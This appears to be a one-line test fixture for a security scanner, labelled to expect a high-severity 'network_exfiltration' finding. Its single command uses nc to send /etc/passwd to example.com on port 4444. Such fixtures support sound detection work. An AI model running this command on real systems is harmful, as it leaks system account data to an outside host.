#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: network_exfiltration
nc example.com 4444 < /etc/passwd
